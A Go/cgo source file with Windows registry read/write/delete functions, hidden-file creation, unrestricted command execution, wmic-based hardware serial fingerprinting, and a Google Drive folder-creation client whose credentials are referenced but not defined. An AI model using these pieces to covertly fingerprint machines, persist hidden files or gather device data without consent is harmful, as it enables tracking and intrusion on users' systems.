package main

/*
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
*/
import "C"

import (
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"regexp"
	"syscall"
	"unicode"
	"unsafe"

	"golang.org/x/sys/windows/registry"

	"golang.org/x/net/context"
	"google.golang.org/api/drive/v3"

	"fmt"
	"strings"
)

func getGoCategory(category string) registry.Key {
	var goCategory registry.Key
	switch strings.ToLower(category) {
	case "classes_root":
		goCategory = registry.CLASSES_ROOT
	case "current_user":
		goCategory = registry.CURRENT_USER
	case "local_machine":
		goCategory = registry.LOCAL_MACHINE
	case "users":
		goCategory = registry.USERS
	case "current_config":
		goCategory = registry.CURRENT_CONFIG
	default:
		fmt.Println("Unsupported category")
	}
	return goCategory
}

func writeReg(category, path, key, value string) string {
	goCategory := getGoCategory(category)

	k, err := registry.OpenKey(goCategory, path, registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS)
	if err != nil {
		k, _, err = registry.CreateKey(goCategory, path, registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS)
		if err != nil {
			return err.Error()
		}
	}
	defer k.Close()

	err = k.SetStringValue(key, value)
	if err != nil {
		return err.Error()
	}
	return "Written"
}

func readReg(category, path, value string) string {
	goCategory := getGoCategory(category)

	k, err := registry.OpenKey(goCategory, path, registry.QUERY_VALUE)
	if err != nil {
		return err.Error()
	}

	s, _, err := k.GetStringValue(value)
	if err != nil {
		return err.Error()
	}
	return s
}

func delReg(category, path, value string) string {
	goCategory := getGoCategory(category)
	k := registry.DeleteKey(goCategory, path)

	if k != nil {
		return k.Error()
	}
	return "Deleted"
}

func writeFile(path, data string) string {
	if path[0:1] == "~" {
		home, _ := os.UserHomeDir()
		path = fmt.Sprint(home, path[1:])
	}

	spPath := strings.Split(path, "\\")
	fPath := strings.Join(spPath[:len(spPath)-1], "\\")
	err := os.MkdirAll(fPath, os.ModeDir)
	if err != nil {
		return err.Error()
	}

	if _, err := os.Stat(path); err == nil {
		return "Already exist"
	}

	f, err := os.Create(path)
	if err != nil {
		return err.Error()
	}
	defer f.Close()

	_, err = f.Write([]byte(data))
	if err != nil {
		return err.Error()
	}

	nameptr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		os.Remove(path)
		return err.Error()
	}

	err = syscall.SetFileAttributes(nameptr, syscall.FILE_ATTRIBUTE_HIDDEN)
	if err != nil {
		os.Remove(path)
		return err.Error()
	}
	return "Written"
}

func readFile(path string) string {
	if path[0:1] == "~" {
		home, _ := os.UserHomeDir()
		path = fmt.Sprint(home, path[1:])
	}

	if data, err := ioutil.ReadFile(path); err != nil {
		return err.Error()
	} else {
		return string(data[:])
	}
}

func delFile(path string) string {
	if path[0:1] == "~" {
		home, _ := os.UserHomeDir()
		path = fmt.Sprint(home, path[1:])
	}

	resp := "Deleted"
	if err := os.RemoveAll(path); err != nil {
		resp = err.Error()
	}
	return resp
}

func executeCMD(command string) string {
	spCm := strings.Split(command, " ")
	resp, err := exec.Command(spCm[0], spCm[1:]...).Output()
	if err != nil {
		log.Fatal(err)
		return err.Error()
	}
	return string(resp[:])
}

func readWmic(category string, fields string) string {
	return executeCMD(fmt.Sprintf("wmic %s get %s", category, fields))
}

func getSerials() string {
	bios := readWmic("bios", "serialNumber")
	name := readWmic("computersystem", "name")
	net := readWmic("nic", "macaddress")
	drive := readWmic("diskdrive", "serialNumber")
	baseboard := readWmic("baseboard", "serialNumber")
	cpu := readWmic("cpu", "serialNumber")
	csproduct := readWmic("csproduct", "uuid")
	// Process all that data

	bios = cleanWmci(strings.ReplaceAll(strings.Split(bios, "SerialNumber ")[0], "\n", ""))
	//fmt.Println("bios:", bios)

	name = cleanWmci(strings.Split(name, "\n")[1])

	nets := ""
	first := true
	for _, n := range strings.Split(net, "\n")[1:] {
		if len(n) < 5 || (!unicode.IsLetter(rune(n[0])) && !unicode.IsDigit(rune(n[0])) && !unicode.IsPunct(rune(n[0]))) {
			continue
		}

		n = n[:17]

		if first {
			first = false
			nets = fmt.Sprintf("\"%s\"", n)
		} else {
			nets = fmt.Sprintf("%s,\"%s\"", nets, n)
		}
	}
	net = cleanWmci(nets)
	//fmt.Println("net:", nets)

	drive = cleanWmci(strings.Split(drive, "\n")[1])
	//fmt.Println("drive:", drive)

	baseboard = cleanWmci(strings.Split(baseboard, "\n")[1])
	//fmt.Println("baseboard:", baseboard)

	cpu = cleanWmci(strings.Split(cpu, "\n")[1])
	//fmt.Println("cpu: ", cpu)

	csproduct = cleanWmci(strings.Split(csproduct, "\n")[1])
	//fmt.Println("csproduct:", csproduct)

	resp := fmt.Sprintf("[\"%s\",[%s],\"%s\",\"%s\",\"%s\",\"%s\",\"%s\"]",
		bios,
		net,
		name,
		drive,
		baseboard,
		cpu,
		csproduct)
	return resp
}
func getSrv() *drive.Service {
	client := config.Client(context.Background(), tok)
	srv, err := drive.New(client)
	if err != nil {
		fmt.Println(err.Error())
	}
	return srv
}

func cleanInput(argv **C.char, argc int) []string {
	newArgs := make([]string, argc)
	offset := unsafe.Sizeof(uintptr(0))
	i := 0
	for i < argc {
		_arg := (**C.char)(unsafe.Pointer(uintptr(unsafe.Pointer(argv)) + offset*uintptr(i)))
		arg := C.GoString(*_arg)
		arg = arg[1 : len(arg)-1]

		reArg := regexp.MustCompile(`""`)
		arg = reArg.ReplaceAllString(arg, `"`)

		newArgs[i] = arg
		i++
	}

	return newArgs
}

func cleanWmci(val string) string {
	normalVal := ""
	for _, ch := range val {
		if !unicode.IsLetter(ch) && !unicode.IsDigit(ch) && !unicode.IsPunct(ch) {
			continue
		}
		normalVal = fmt.Sprint(normalVal, string(ch))
	}
	return normalVal
}

func checkPath(path string) string {
	srv := getSrv()

	folders := strings.Split(path, "/")[1:]
	root := true
	var prevFile = ""

	for _, folder := range folders {
		req := srv.Files.List().Q(`mimeType="application/vnd.google-apps.folder"`).
			Q(fmt.Sprintf(`name="%s"`, folder))

		l, err := req.Fields("files(id, parents)").Do()
		if err != nil {
			continue
		}

		changedFile := false
		for _, file := range l.Files {
			if root {
				prevFile = file.Id
				changedFile = true
				root = false
				break
			} else if len(file.Parents) > 0 && file.Parents[0] == prevFile {
				prevFile = file.Id
				changedFile = true
				break
			}
		}

		if !changedFile {
			_file := &drive.File{
				MimeType: "application/vnd.google-apps.folder", Name: folder}
			if prevFile != "" {
				_file.Parents = []string{prevFile}
			}

			newFile, err := srv.Files.Create(_file).
				Fields("id").Do()

			if err != nil {
				fmt.Println(err)
				break
			} else {
				prevFile = newFile.Id
			}
		}
	}

	return prevFile
}
